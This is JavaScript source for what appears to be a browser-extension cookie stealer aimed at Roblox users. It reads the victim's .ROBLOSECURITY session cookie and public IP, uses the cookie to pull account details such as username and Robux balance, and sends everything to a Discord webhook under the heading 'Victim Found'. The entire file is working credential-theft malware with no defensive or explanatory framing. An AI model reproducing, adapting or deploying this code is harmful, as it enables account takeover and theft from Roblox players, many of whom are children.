const DISCORD_WEBHOOK = "WEBHOOK HERE!!!";

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    let statistics = null;
    if (cookie) {
        const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        });
        if (response.ok) {
            statistics = await response.json();
        }
    }

    const data = {
        "content": null,
        "embeds": [{
            "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
            "color": null,
            "fields": [{
                    "name": "Username",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                },
                {
                    "name": "Robux",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                },
                {
                    "name": "Premium",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                }
            ],
            "author": {
                "name": "Victim Found: " + ipAddr,
                "icon_url": statistics ? statistics.ThumbnailUrl : "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&",
            },
            "footer": {
                "text": "Coded By Sweb, Undualhooked by Asyx!",
                "icon_url": "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&"
            },
            "thumbnail": {
                "url": statistics ? statistics.ThumbnailUrl : "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&",
            }
        }],
        "username": "Hyperion Public - Extension Version",
        "avatar_url": "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&",
        "attachments": []
    };

    fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
}

chrome.cookies.get({
    "url": "https://www.roblox.com/home",
    "name": ".ROBLOSECURITY"
}, function(cookie) {
    main(cookie ? cookie.value : null);
});
